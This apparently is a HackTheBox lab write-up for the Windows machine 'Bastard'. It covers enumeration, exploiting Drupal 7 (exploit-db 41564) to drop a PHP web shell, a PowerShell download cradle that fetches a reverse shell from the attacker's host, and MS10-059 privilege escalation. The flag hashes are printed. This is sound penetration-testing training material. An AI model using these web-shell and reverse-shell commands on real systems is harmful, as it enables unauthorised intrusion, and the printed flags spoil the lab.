+++
title = "HTB - Bastard"
date = 2025-06-27
+++

<img alt="Image" async src="images/Bastard.png" width="800px"></img>

Bastard is a box that is initially frustrating. This machine tests ones ability to enumerate thoroughly AND simply, transfer files in different ways, and doctor downloaded exploits to suit one's needs. 

### Scan
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 07:24 EDT
Nmap scan report for 10.10.10.9
Host is up (0.12s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds



---------------------Starting Nmap Basic Scan---------------------
                                                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 07:24 EDT
Nmap scan report for 10.10.10.9
Host is up (0.12s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.53 seconds

```

### Enumeration

<img alt="Image" async src="images/Screenshot 2024-09-14 at 12.39.22 PM.png" width="800px"></img>

We are greeted with a login portal when we visit the sight. Trying a few common credentials yield no access, so I opted to look through the `feroxbuster` scan I had running in the background. Most of the directories are off limits with a `403 Error`, meaning that we'll need to find something else.

Doing research, I looked at my `nmap` scan again to see version numbers of the services running. This is a part of the simple, yet thorough enumeration that we need to "make haste slowly." `Microsoft IIS 7.5` didn't yield much compared to what I found for `Drupal 7`, which yielded a RCE vulnerability.

<img alt="Image" async src="images/Screenshot 2024-09-14 at 12.45.19 PM.png" width="800px"></img>

We can cross check this with `exploit-db 41564` or `searchsploit Drupal` and sure enough, we've got a script here that uses SQL injection to get the contests of the cache for the current endpoint along with the admin hash and credentials. Then, the script alters the cache to allow file writing, and follows this up by posting a POC at the designated endpoint. 

<img alt="Image" async src="images/Screenshot 2024-09-14 at 12.51.49 PM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-14 at 1.14.43 PM.png" width="800px"></img>

We know the URL, and we know that we'll need to use a PHP one-liner to get our remote code execution ability, but we need to figure our where the API endpoint is. `/rest_endpoint` is not available on the box, but `/rest`is! There are two ways to figure this out. Trial and error is how I came upon it, but using a directory busting tool works as well, providing you give it the time!

We want to use the POC instead to write a PHP one-liner that grants us RCE on the machine. So, we can substitute with this in order to make sure our uploaded file works:

`'<?php system($_REQUEST["cmd"]); ?>'`

Also, don't forget to alter the endpoint! The completed script should look like this, with emphasis on the url, endpath, and file:

<img alt="Image" async src="images/Screenshot 2024-09-14 at 1.31.26 PM.png" width="800px"></img>

### Initial Access

Before we run our exploit, we also need to make sure that we've installed php-curl on our machine. We can use `apt-get install php-curl`. Now, we can run our exploit with `php 41564.php`

<img alt="Image" async src="images/Screenshot 2024-09-14 at 1.32.28 PM.png" width="800px"></img>

We get an endpoint that tells us where the file's been written. When we visit, make sure to bring up the request in Burp, where we can edit our requests in real time. Append your malicious file name with `?cmd=systeminfo`, and we can see that our attempt for RCE has worked!

<img alt="Image" async src="images/Screenshot 2024-09-14 at 1.38.02 PM.png" width="800px"></img>

One thing to note... We've got two files noted `session.json` and `user.json`. These provide cookie information and a username and hashed password for the administrator account. We could take these and try to gain access this way, but we've already got a shell... Maybe another day.

Ok, so now, we can call for a real shell, and the easiest way to do this is with Nishang's Invoke-PowerShellTcp, as we're dealing with an x64 Windows Machine and we want as much functionality as possible. Let's edit the file to include the correct parameters for our future listener.

Add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.4.3 -Port 4444` to the very end of the file. You can copy in the `vim` editor with `yy` and paste with `d`. 

Once we have our file ready, we need to serve it with a Python server from the same directory that it lies, and set up a wrapped listener:

`python3 -m http.server 8000`
`rlwrap nc -nlvp 4444`

Let's get back and use Burp to create our request. MAKE SURE TO URL ENCODE. Additionally, make sure that the spelling is exact when posting the file and path - capitalization and all :

`powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`

<img alt="Image" async src="images/Screenshot 2024-09-14 at 2.44.26 PM.png" width="800px"></img>

We should get access on our listener.

<img alt="Image" async src="images/Screenshot 2024-09-14 at 2.44.45 PM.png" width="800px"></img>

We can navigate to `/Users/dimitris/Desktop` in order to find our user flag.

`USER:d187f6b9f9bc6b5df88b7f607e720776`

### Privilege Escalation

In order to escalate, we can check things out with `ps`  and `systeminfo`. We can also serve an enumeration script from our Kali machine. I like `winpeas` and `winenum`, but for this case, `sherlock` was the best option, as it gave us a list of possible CVE's, which are very common on these lab machines.

Find Sherlock with `locate Sherlock.ps1` and bring it to the working directory. Serve the file with our SMB server this time, and download on the victim machine. Locate `smbserver.py` first (usually in Impacket) and move it to working directory before running these commands:

`KALI - python3 smbserver.py share /home/li0t/Desktop/HTB/Bastard`
`VICTIM - copy \\10.10.14.3\share\Sherlock.ps1`

Now, no matter how hard I tried, I couldn't get permission on the victim machine to download files and run them, so I took a page from Rana Khalil and exported `systeminfo` into the `windows-exploit-suggester` on my Kali machine. To do this, we need to update our tool and query the database. First, copy the script to `pwd`:

`./windows-exploit-suggester.py --update`
`./windows-exploit-suggester.py -d 2024-09-14-mssb.xls -i sysinf.txt`

Now, we can get MS tags for exploits, and run through them to see if any work. 

<img alt="Image" async src="images/Screenshot 2024-09-14 at 3.22.52 PM.png" width="800px"></img>

We'll go with this one, MS10-059, as I've tried unsuccessfully with Kernel exploits here before. There is a compiled version that can be found on github [here](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled) Once this is in our working directory, or the same place as our SMB server, we can share between the systems. I think it's important to note, I've only gotten this machine rooted with this .exe file used in this context. Even my privesc scripts of the same type don't register, and I dunno why...

Once we're ready, set up a listener 

`rlwrap nc -nlvp 4445`

Then, go onto the compromised machine and use:

`\\10.10.14.3\share\FILE.exe 10.10.14.3 4445`

<img alt="Image" async src="images/Screenshot 2024-09-14 at 3.38.47 PM.png" width="800px"></img>

Cooking.

`ROOT:b3056a76131b8c975a906cff1283ba05`

#windows #manual #medium